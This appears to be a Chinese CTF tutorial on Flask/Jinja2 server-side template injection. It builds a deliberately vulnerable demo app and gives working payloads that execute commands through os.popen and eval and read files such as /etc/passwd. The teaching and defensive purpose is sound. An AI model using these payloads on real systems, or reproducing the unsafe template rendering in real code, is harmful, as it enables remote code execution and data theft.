@@ -1,0 +1,651 @@
+# 初探 Python Flask+Jinja2 SSTI
+
+阅读量 **280436**
+
+|评论 **2**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2021-01-12 16:30:55
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+## SSTI简介
+
+SSTI主要是因为某些语言的框架中使用了渲染函数，比如Python中的Flask框架用jinjia2模块内的渲染函数，在不规范的代码中，导致用户可以控制变量并构造恶意的表达式，比如`{{98-2}}`，恶意的表达式未经严格的过滤直接带入模板中渲染执行使得攻击者可以读取文件，远程代码执行等等。现在最多的还是在CTF中遇到该漏洞，最多的也是Python+flask+jinja2，通过绕过过滤规则成功命令执行+读取文件拿到flag，本文也会从0开始一点点剖析该漏洞的成因与利用。
+
+## Flask
+
+###  Flask简介
+
+**Flask** 是一个用Python编写的 **Web应用程序框架**
+优点是提供给用户的扩展能力很强，框架只完成了简单的功能，有很大一部分功能可以让用户自己选择并实现。
+
+**WSGI**
+
+**Web Server Gateway Interface（Web服务器网关接口，WSGI）** 已被用作Python Web应用程序开发的标准。
+WSGI是Web服务器和Web应用程序之间通用接口的规范。而Flask类的实例就是WSGI应用程序。
+
+**Werkzeug**
+
+它是一个WSGI工具包，它实现了请求，响应对象和实用函数。 这使得能够在其上构建web框架。
+Flask框架使用Werkzeug作为其基础之一。也就是Flask的URL规则也是基于此。
+
+###  Flask安装
+
+    
+    
+    pip3 install flask  # 获取最新版本flask
+    
+
+###  创建Flask项目
+
+可以根据下图创建一个基于python3的flask项目
+
+![](https://p4.ssl.qhimg.com/t0141d3c386bb45297f.png)
+
+![](https://p4.ssl.qhimg.com/t01063d591cfd0cf26c.png)
+
+###  Flask e.g.
+
+样例代码：
+
+`app = Flask(__name__)`
+：Flask类必须指定一个参数，即主模块或包的名字。这里`__name__`为系统变量，指的是当前py文件的文件名。
+
+`[@app](https://github.com/app "@app").route()`：
+路由与视图函数。从client发送的url通过web服务器传给flask实例对象时，因为该实例需要知道对于每个url要对应执行哪部分的函数所以保存了一个url和函数之间的映射关系，处理url和函数之间关系的程序称为路由，在flask中用的是app.route路由装饰器，把装饰的函数注册为路由。简单理解就是`[@app](https://github.com/app
+"@app").route(url)`装饰器告诉Flask什么url触发什么函数，而通过装饰器将函数与url绑定在一起就称为路由。  
+`app.run()`：样例为 `run_simple(host, port, self, **options)`
+当不设置时，默认监听127.0.0.1:5000,
+监听0.0.0.0的话则任意IP都可访问。该函数作用为开启flask集成的web服务，服务开启后会一直监听5000端口并处理请求知道程序停止。
+
+    
+    
+    from flask import Flask
+    
+    app = Flask(__name__)
+    
+    @app.route('/')
+    def index():
+        return 'hello Zh1z3ven'
+    
+    
+    if __name__ == '__main__':
+        app.run()
+    
+
+运行一下当前的py文件，控制台出现如下图所示的日志，flask默认监听在5000端口，访问一下看看。
+
+![](https://p4.ssl.qhimg.com/t01d73f80d984b3b3b9.png)
+
+![](https://p1.ssl.qhimg.com/t0110bd048ba50c3ad7.png)
+
+###  Flask中的路由
+
+上面我们也提到了，简单理解就是`[@app](https://github.com/app
+"@app").route(url)`装饰器告诉Flask什么url触发什么函数，而通过装饰器将函数与url绑定在一起就称为路由。
+
+这里看一下路由的几个基本操作
+
+**0x01 指定访问路径为/**
+
+    
+    
+    @app.route('/')
+    def index():
+        return 'hello Zh1z3ven'
+    
+
+**0x02 传递参数**
+
+这里可以实现url的动态获取并在页面输出username
+
+    
+    
+    @app.route('/user/<username>')
+    def hi_user(username):
+        return 'hi %s' % username
+    
+
+  
+**0x03 限定请求方式**
+
+在`[@app](https://github.com/app
+"@app").route`中，可以通过如下设置：`[@app](https://github.com/app
+"@app").route('/user/<int:user_id>', methods=['GET', 'POST'])`
+设置参数`user_id`的数据类型，以及http请求方式。
+
+    
+    
+    @app.route('/user/<int:user_id>', methods=['GET', 'POST'])
+    def hi_userid(user_id):
+        return 'hello %d' % user_id
+    
+
+![](https://p5.ssl.qhimg.com/t0153c10dabcb08875f.png)
+
+###  main入口
+
+在Flask官方文档也提到最好用 `if __name__ == '__main__'` 来作为程序入口 python中的main入口也就是 `if
+__name__ == '__main__'`
+
+当运行py文件时因为 当前 **文件名** (`__name__`)与 **顶层代码作用域**
+(`__main__`)是相等的，所以会执行后面的代码块，而当该文件作为一个模块被import到别的文件时，此时并不会执行该文件，而是类似于php中include函数那样将该文件包含到其他文件中去。
+
+到此Flask的工作流程
+大致就已经清晰了，首先是当程序运行时，app.run()被调用执行并监听相应的host和port（默认为127.0.0.1:5000），当客户端有http请求通过浏览器发送至服务器端时时，服务端会根据request中的url对照路由找到相应需要执行的函数，并将函数返回值生成response反馈给客户端。
+
+## Jinja2渲染模板
+
+###  简介
+
+jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。
+
+###  基本语法
+
+0x01 `{%%}`
+
+主要用来声明变量或用在条件语句或循环语句
+
+注意条件和循环需要多一层 {%endif%} 或 {%endfor%}用作结尾
+
+    
+    
+    {% set c = 'Zh1z3ven' %}
+    {% if 1==1 %}Zh1z3ven{%endif%}
+    {% for i in [1, 2, 3] %}Zh1z3ven{%endfor%}
+    
+
+0x02 `{{}}`
+
+将大括号内的表达式执行并输出结果到模板内
+
+    
+    
+    {{98-2}} # 96
+    
+
+0x03 `{##}`
+
+注释
+
+###  存在漏洞的Demo
+
+在jinja2中存在一个模板类`Tempalte`，`Template`类中的`render()`方法可以实现渲染的作用。而在jinja2中存在三种语法，针对CTF的话遇到的就是`{{}}`和`{%%}`，`{{}}`代表变量取值，是一种特殊的占位符，当我们传入的是一个表达式或方法，则会执行并返回他们的结果传入客户端，比如看下面这段代码我们执行后构造一个表达式去访问查看页面结果：
+
+    
+    
+    from flask import Flask, request
+    from jinja2 import Template
+    
+    app = Flask(__name__)
+    
+    @app.route('/')
+    def test1():
+        name = request.args.get('name')
+    
+        t = Template('''
+    <html>
+      <head>
+        <title>Zh1z3ven</title>
+      </head>
+     <body>
+          <h1>Hello, %s !</h1>
+      </body>
+    </html>
+    
+        '''% (name))
+    
+        return t.render()
+    
+    
+    if __name__ == '__main__':
+        app.run()
+    
+
+![](https://p2.ssl.qhimg.com/t01219e5e43b860e627.png)
+
+这里可以看到是存在SSTI注入的，因为在`{{98-2}}`中的表达式被执行了，也就是漏洞成因：当在不规范的代码中，直接将用户可控参数`name`在模板中直接渲染并将结果带回页面回显。所以在name参数输入`{{98-2}}`会输出`{{96}}`
+
+###  不存在漏洞的Demo
+
+而在flask中常用的渲染方法为`render_template()` 、 `render_template_string()`
+
+当使用 `render_template()` 时，扩展名为 `.html` 、 `.htm` 、 `.xml` 和 `.xhtml`
+的模板中开启自动转义。
+
+当使用 `render_template_string()` 时，字符串开启 自动转义。
+
+简单示例如下：
+
+    
+    
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>{{title}} - Zh1z3ven</title>
+    </head>
+    <body>
+        <h1>Hello, {{user.name}}</h1>
+        <h2>This is {{user.name}} information:{{user.info}}</h2>
+    </body>
+    </html>
+    
+
+其中`{{title}}`、`{{user.name}}`、`{{user.info}}`即为需要渲染的对象，我们在app.py里对其进行渲染。
+
+    
+    
+    from flask import Flask
+    from flask import render_template
+    
+    app = Flask(__name__)
+    
+    
+    @app.route('/')
+    @app.route('/index')
+    def index():
+        user = {
+            'name' : 'Zh1z3ven',
+            'info' : 'I am Zh1z3ven'
+        }
+        return render_template("index.html", title='Home', user=user)
+    
+    
+    if __name__ == '__main__':
+        app.run()
+    
+
+运行app.py 下面我们看一下页面结果：
+
+![](https://p2.ssl.qhimg.com/t01993b9ebc6620fc76.png)
+
+上面就是一个简单且正常通过渲染的页面，因为需要渲染的参数我们都在app.py中写死了，并未交给用户控制，所以不存在SSTI注入。但是CTF或开发人员写好的代码将渲染的参数交给用户可控，并且没有对参数进行过滤那么可能会导致SSTI注入漏洞的产生。
+
+通过两个例子也可以大致感受到漏洞的成因了
+
+1、存在用户可控参数。
+
+2、参数可被带入渲染函数内直接执行，即{{}}可被带入代码中让jinja2模块识别并解析。
+
+## SSTI思路
+
+在CTF中，python的ssti大多是依靠某些继承链：基类—>子类—>危险方法来实现命令执行+文件读取，这里有点类似于java的反序列化漏洞寻找调用链的意思。其实主要还是依据python中的内置类属性和方法通过寻找可以读文件或执行命令的模块与函数达到我们的目的。
+
+###  内置类属性和方法
+
+Python中的类和对象有许多内置属性以及相关函数，下面记录一些经常会用到的，可能会不全，遇到了再补充。
+
+**0x01`__class__`**
+
+python中一切皆对象，该方法返回当前对象所属的类，比如字符串对象则返回`<class 'str'>`
+
+    
+    
+    >>> "".__class__
+    <class 'str'>
+    
+
+**0x02`__bases__`**
+
+以元组的形式返回一个类所直接集成的类。大多是用来获取到基类(object)，比如：
+
+    
+    
+    >>> "".__class__.__bases__
+    (<class 'object'>,)
+    
+
+**0x03`__base__`**
+
+以字符串形式返回一个类所直接集成的类
+
+**0x04`__mro__`**
+
+返回解析方法调用的顺序。
+
+    
+    
+    >>> "".__class__.__mro__
+    (<class 'str'>, <class 'object'>)
+    
+
+**0x05`__subclasses__()`**
+
+获取类的所有子类，经常配合`__bases__` `__mro__`来找到我们想要的读取文件或执行命令的类
+
+比如：`"".__class__.__bases__[0].__subclasses__()`
+
+或者：`"".__class__.__mro__[1].__subclasses__()`
+
+**0x06`__init__`**
+
+所有的可被当作模块导入的都包含 `__init__`方法，通过此方法来调用 `__globals__`方法
+
+**0x07`__globals__`**
+
+所有函数都会有一个 `__globals__` 属性， 用于获取当前空间下可使用的模块、方法及其所有变量，结果是一个字典。
+
+    
+    
+    >>> import os
+    >>> var = 2333
+    >>> def fun():
+        pass
+    
+    >>> class test:
+        def __init__(self):
+            pass
+    
+    
+    >>> print(test.__init__.__globals__)
+    {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'os': <module 'os' from 'C:\\Python3.7\\lib\\os.py'>, 'var': 2333, 'fun': <function fun at 0x00000238058C11F8>, 'test': <class '__main__.test'>}
+    
+
+**0x08`__builtins__`**
+
+**在pyton2中为`__builtins__` 和 `__builtin__`**
+
+这里 `__builtins__`
+是内建名称空间，是这个模块本身定义的一个名称空间，在这个内建名称空间中存在一些我们经常用到的内置函数（即不需要导入包即可调用的函数）如：print()、str()还包括一些异常和其他属性。
+
+而 `__builtins__` 实际上是一个指向或者说引用 `__builtin__` 的（有点类似于软链接），而真正BIF在被定义时是在
+`__builtin__` 模块中进行的。
+
+**在python3中为`__builtins__` 和 `builtins`**
+
+这里只不过 `builtins` 代替的 `__builtin__`
+
+在python中有一些BIF（内置函数）是可以直接调用的，比如str(), print()等，这些函数可以通过 `dir(__builtins__)`
+可以查到。
+
+![](https://p0.ssl.qhimg.com/t0132c98ea48d068b61.png)
+
+**0x09 内省request对象**
+
+即为Flask模板的一个全局变量request对象（flask.request），代表当前请求对象。
+
+当然可利用的远不止这些，上面只是做一点简单的总结，后续遇到有趣的姿势继续补充（填坑）。
+
+###  利用思路
+
+1、随便找一个内置类对象利用 `__class__`拿到该对象所对应的类
+
+    
+    
+    ''.__class__.__bases__[0].__subclasses__()
+    ().__class__.__mro__[2].__subclasses__()
+    ().__class__.__mro__[-1].__subclasses__()
+    request.__class__.__mro__[1]
+    
+
+2、用 `__bases__` 或 `__mro__` 拿到基类 `<class 'object'>`
+
+3、用 `__subclasses__()` 获取所有子类
+
+4、在子类中寻找可以合适的继承链执行命令或读取文件
+
+## STTI利用
+
+###  测试代码
+
+    
+    
+    from flask import Flask, request
+    from jinja2 import Template
+    
+    
+    app = Flask(__name__)
+    
+    
+    @app.route('/')
+    def test1():
+        name = request.args.get('name')
+    
+        t = Template('''
+    <html>
+    <head>
+    <title>Zh1z3ven</title>
+    </head>
+    <body>
+        <h1>Hello, %s !</h1>
+    </body>
+    </html>
+    
+        '''% (name))
+    
+        return t.render()
+    
+    
+    if __name__ == '__main__':
+        app.run(host='127.0.0.1', debug=True)
+    
+
+### 0x01 `__bultins__`
+
+**python2 &python3均适用**
+
+比如我们打开一个python3的shell，键入 `"".__class__`
+
+![](https://p2.ssl.qhimg.com/t019c4215760e5802ad.png)
+
+可以看到结果为 `<class 'str'>`
+
+再接着下一步，我们要获取到基类 `object` 键入：`"".__class__.__bases__`
+
+![](https://p3.ssl.qhimg.com/t019d281a2a3e8ebf47.png)
+
+可以看到结果是一个元组，而元组的第一个元素是基类 `object` ，所以要获取基类需要 `.__bases__[0]` ; 我们下面看看基类下的所有子类
+，键入： `"".__class__.__bases__[0].__subclasses__()`
+
+![](https://p4.ssl.qhimg.com/t01694629c956b130fe.png)
+
+这里可以看到有相当多的子类，且不同的Python版本在这里获取到的所有子类的顺序也不同，但是这样还是不太直观毕竟有几百个子类，我们用个小脚本进行筛选看看各个子类所处空间下可调用的模块、方法和变量都有什么也就是
+`function.__globals__` 的结果。下面贴个寻找类对应顺序的脚本：
+
+用法大概是这样的，因为大概思路前面前三步基本差不多，主要是后面 `__init__.__globals__`
+后面的姿势会很多，也是一个难理解的点。这个脚本就是找从`__init__.__globals__`
+后面想要根据那个思路入手取执行命令或读取文件，比如下面我想用 `__builtins__` 去构造执行命令的继承链:
+先查询都哪些子类调用了`__builtins__`
+
+find.py
+
+    
+    
+    search = '__builtins__'   
+    num = -1
+    for i in ().__class__.__bases__[0].__subclasses__():
+        num += 1
+        try:
+            if search in i.__init__.__globals__.keys():
+                print(i, num)
+        except:
+            pass
+    
+
+![](https://p1.ssl.qhimg.com/t0197beb8b312352a1c.png)
+
+这里拿经典的 `<class 'os._wrap_close'> 128` 举例，构造payload如下：
+
+`http://127.0.0.1:5000/?name={{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')}}`
+
+ps：eval()函数用来执行一个字符串表达式，并返回表达式的值，这里相当于调用了os模块利用popen函数执行whoami
+
+![](https://p1.ssl.qhimg.com/t0119b7dc663a3fcc74.png)
+
+当然利用`__builtins__`还有很多其他姿势，需要注意的就是python2与python3中有些函数不一样需要进行替换
+
+**Python3 payload**
+
+    
+    
+    # 0x01 利用eval()将其中字符串作为代码执行  
+    {{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")}}
+    
+    
+    {{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}
+    
+    # 0x02 直接调用__import__()构造payload执行命令
+    {{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}
+    
+    # 0x03 调用open()读取文件
+    {{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['open']('C:\\Windows\win.ini').read()}}
+    
+
+**python2 payload**
+
+（1）linecache执行命令
+
+同样是先找到子类中有可直接调用linecache的，
+
+![](https://p3.ssl.qhimg.com/t0106b54c1aca35f9f9.png)
+
+    
+    
+    (<class 'warnings.WarningMessage'>, 59)
+    (<class 'warnings.catch_warnings'>, 60)
+    
+
+payload
+
+    
+    
+    {{[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].os.popen('whoami').read()}}
+    
+
+![](https://p5.ssl.qhimg.com/t01b61e591f8f4ad91b.png)
+
+（2） file类读取文件
+
+file类是只存在python2的，python3没有，但是类似于open
+
+payload
+
+    
+    
+    {{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}
+    
+    {{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()}}
+    
+
+### <a name=”0x02 `['popen']("command").read()`” class=”reference-link”>0x02
+`['popen']("command").read()`
+
+这里思路是直接找某个子类可以直接调用popen这个方法，这里在本地找到的是 `os._wrap_close` 这个类。
+
+payload
+
+    
+    
+    http://127.0.0.1:5000/?name={{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']("whoami").read()}}`
+    
+
+![](https://p0.ssl.qhimg.com/t01c1d2c4e0ea168673.png)
+
+### 0x03 直接调用 `__import__()`
+
+这里思路是找子类中可以直接调用 `__import__()` 然后引用 os 模块去执行命令
+
+先通过find.py找到可以直接调用 `__import__()`的子类
+
+![](https://p4.ssl.qhimg.com/t01c61d9bc43ba144e0.png)
+
+之后通过 `__import__()` 调用os模块去执行命令，payload如下：
+
+    
+    
+    {{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
+    
+
+![](https://p3.ssl.qhimg.com/t01e607b9f1a6d95d79.png)
+
+###  0x04 利用循环构造payload
+
+上面提到过 `{% for i in [1, 2, 3] %}Zh1z3ven{%endfor%}` 可用作循环。我们改造下0x01 中利用
+`os._wrap_close` 类的 `['__builtins__']['eval']` 注入
+
+**执行命令的payload** 如下,这里有一个小坑点，比如我们第一次if判断 `if i.__name__ ==
+'_wrap_close'`时，==右面不能写 `os._wrap_close` 而要写`_wrap_close` ,因为 `__name__` 返回值是
+`_wrap_close`
+
+![](https://p0.ssl.qhimg.com/t01a0903a24d055be08.png)
+
+    
+    
+    {% for i in "".__class__.__base__.__subclasses__() %}
+    {% if i.__name__ == '_wrap_close' %}
+      {% for x in i.__init__.__globals__.values() %}   
+      {% if x.__class__ == {}.__class__ %}  # 筛选出dict类型元素
+        {% if 'eval' in x.keys() %}  
+            {{ x['eval']('__import__("os").popen("whoami").read()')}}
+        {% endif %}
+      {% endif %}
+      {% endfor %}
+    {% endif %}
+    {% endfor %}
+    
+
+![](https://p2.ssl.qhimg.com/t015ab8c86115a47699.png)
+
+**读取文件payload** ,注意Windows环境需要 `\\` 标识路径
+
+    
+    
+    {% for i in "".__class__.__base__.__subclasses__() %}{% if i.__name__ == '_wrap_close' %}{{i.__init__.__globals__['__builtins__'].open('C:\\Users\\LENOVO\\Desktop\\1.txt', 'r').readlines()}}{% endif %}{% endfor %}
+    
+
+![](https://p0.ssl.qhimg.com/t018016eaf6442d85fd.png)
+
+## 小结
+
+当然关于SSTI利用远不止这些，且还有常见的过滤以及被ban函数的相关绕过姿势这里也没有写上，准备下一篇记录关于CTF基于常见的过滤的绕过姿势。这篇主要还是放在理解Flask+jinja2语法和SSTI这个洞入门。
+
+## 参考文章
+
+<https://xz.aliyun.com/t/3679>  
+<https://xz.aliyun.com/t/7746>  
+<https://xz.aliyun.com/t/6885>  
+<https://www.cnblogs.com/chaojiyingxiong/p/9549987.html>  
+<https://www.yuque.com/jxswcy/ctfnotebook/tdxk3n>  
+<https://www.anquanke.com/post/id/85571>  
+<https://hetian.blog.csdn.net/article/details/111399386>  
+<https://xz.aliyun.com/t/2308#toc-10>
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Zh1z3ven** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/226900](/post/id/226900)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [SSTI](/tag/SSTI)
+
+ **+1** __4赞
+
+ __收藏
+
+![](https://thirdwx.qlogo.cn/mmopen/vi_32/vRwu3zzRPhiaer28hCoOic0icQvbQOwPjM5cdicAOaYeg6hOzvzGLyDbJMWjBA3CrmmeZuicbicySTlBC3VP6zhrgt6w/132)
+Zh1z3ven
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
